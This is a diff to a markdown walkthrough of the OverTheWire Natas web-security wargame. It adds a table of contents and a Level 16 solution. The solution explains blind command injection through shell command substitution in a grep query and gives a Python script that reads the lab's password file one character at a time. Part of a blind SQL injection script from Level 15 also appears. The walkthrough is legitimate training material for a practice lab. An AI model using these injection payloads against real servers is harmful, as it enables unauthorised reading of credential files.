@@ -2,7 +2,7 @@
 
 [![OverTheWire: Natas](https://img.shields.io/badge/OverTheWire-Natas-white)](https://overthewire.org/wargames/natas/)
 
-The `Natas` wargame is a series of web security challenges. Many of the earlier challenges can be solved with the browser's built-in developer tools and `curl`. For the challenges that can't be solved within those, I like to use `CyberChef`, `Burp Suite Community`, and `Python`. However, there are many other great tools out there that you can use, so just use what you're comfortable with.
+The `Natas` wargame is a series of web security challenges. Many of the earlier challenges can be solved with the browser's built-in developer tools and command line utilities. For the challenges that can't be solved within those, I like to use `CyberChef`, `Burp Suite Community`, and `Python`. However, there are many other great tools out there that you can use, so just use what you're comfortable with.
 
 **Connecting to Natas**
 
@@ -11,6 +11,46 @@ Username: natas0
 Password: natas0
 URL:      http://natas0.natas.labs.overthewire.org
 ```
+
+<details>
+<summary><b>Table of Contents</b></summary>
+
+- [Level 0](#level-0)
+- [Level 1](#level-1)
+- [Level 2](#level-2)
+- [Level 3](#level-3)
+- [Level 4](#level-4)
+- [Level 5](#level-5)
+- [Level 6](#level-6)
+- [Level 7](#level-7)
+- [Level 8](#level-8)
+- [Level 9](#level-9)
+- [Level 10](#level-10)
+- [Level 11](#level-11)
+- [Level 12](#level-12)
+- [Level 13](#level-13)
+- [Level 14](#level-14)
+- [Level 15](#level-15)
+- [Level 16](#level-16)
+- [Level 17](#level-17)
+- [Level 18](#level-18)
+- [Level 19](#level-19)
+- [Level 20](#level-20)
+- [Level 21](#level-21)
+- [Level 22](#level-22)
+- [Level 23](#level-23)
+- [Level 24](#level-24)
+- [Level 25](#level-25)
+- [Level 26](#level-26)
+- [Level 27](#level-27)
+- [Level 28](#level-28)
+- [Level 29](#level-29)
+- [Level 30](#level-30)
+- [Level 31](#level-31)
+- [Level 32](#level-32)
+- [Level 33](#level-33)
+
+</details>
 
 ## Level 0
 
@@ -231,7 +271,7 @@ if($key != "") {
 ?>
 ```
 
-This challenge is similar to the last level except the characters `;` and `&` aren't allowed. Luckily for us, `grep` actually lets us search multiple files by just separating the filenames with a space. We didn't actually need the `;` to solve the last level but I added it so it would only print out the password.
+This challenge is similar to the last level except the characters `;`, `|`, and `&` aren't allowed. Luckily for us, `grep` actually lets us search multiple files by just separating the filenames with a space. We didn't actually need the `;` to solve the last level but I added it so it would only print out the password.
 
 We *could* use `needle=. /etc/natas_webpass/natas11`, but `needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11` also works and only returns the password.
 
@@ -612,6 +652,94 @@ def get_password(charset):
             sqli = f'natas16" and password like binary "{password+char}%'
             r = requests.get(url+sqli, auth=auth)
             if 'This user exists.' in r.text:
+                password += char
+                break
+        else:
+            break
+    return password
+
+
+if __name__ == '__main__':
+    charset = get_charset()
+    password = get_password(charset)
+    print(password)
+```
+
+## Level 16
+
+![natas16_index.jpg](screenshots/natas/natas16_index.jpg)
+
+[Sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html):
+
+```php
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+Looks like we have another `grep` challenge. This time, there are a ton of extra characters that aren't allowed in our query. Our input is also wrapped with double quotes to prevent us from grepping multiple files like we did before. This is actually a blessing in disguise because in Linux, the shell will still interpret special characters on strings wrapped with double quotes.
+
+Despite being able to use special characters, we still can't get around the fact that our query is quoted. Anything we send will end up being grepped in `dictionary.txt`. Sounds like another blind injection attack to me. Now we just need to craft a *true* or *false* query that will help us find the password.
+
+We can solve this challenge with command substitution and a nested `grep` command. By using command substitution, we can enumerate the `/etc/natas_webpass/natas17` file with something like this:
+
+```bash
+$(grep ^<injection> /etc/natas_webpass/natas17)
+```
+
+This will expand to the password, which will make the outer `grep` to search for the password in `dictionary.txt`. We also need to set a default word to look for to indicate wrong answers. Pick any word in the wordlist that is easily identifiable (i.e. does not conflict with any text in the source code).
+
+```bash
+$(grep ^<injection> /etc/natas_webpass/natas17)password
+```
+
+We can reuse the code from the last challenge to get [this (without asyncio)](files/natas/natas16.py) and [this (with asyncio)](files/natas/natas16_async.py):
+
+```python
+#!/usr/bin/env python3
+import requests
+
+
+url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
+auth = ('natas16', natas16_pass)
+
+def get_charset():
+    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+    charset = ''
+    for char in alnum:
+        search = f'$(grep {char} /etc/natas_webpass/natas17)'
+        r = requests.get(url.format(search), auth=auth)
+        if 'password' not in r.text:
+            charset += char
+    return charset
+
+def get_password(charset):
+    password = ''
+    while True:
+        for char in charset:
+            search = f'$(grep ^{password+char} /etc/natas_webpass/natas17)'
+            r = requests.get(url.format(search), auth=auth)
+            if 'password' not in r.text:
                 password += char
                 break
         else:
